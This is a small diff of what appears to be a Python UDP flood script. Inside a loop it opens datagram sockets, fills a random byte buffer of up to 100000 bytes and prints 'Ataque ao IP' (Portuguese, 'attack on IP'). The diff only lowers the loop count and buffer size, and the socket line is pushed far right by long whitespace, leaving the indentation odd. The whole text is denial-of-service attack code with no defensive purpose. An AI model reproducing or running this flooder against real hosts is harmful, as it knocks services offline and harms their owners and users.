@@ -63,6 +63,6 @@ if 'responder' == 'y' or 0:
 
 time.sleep(2)
 
-for x in range(100000):                                                                                                     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-      bytes = random._urandom(100000)
+for x in range(10000):                                                                                                     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      bytes = random._urandom(10000)
       print('Ataque ao IP', IP)
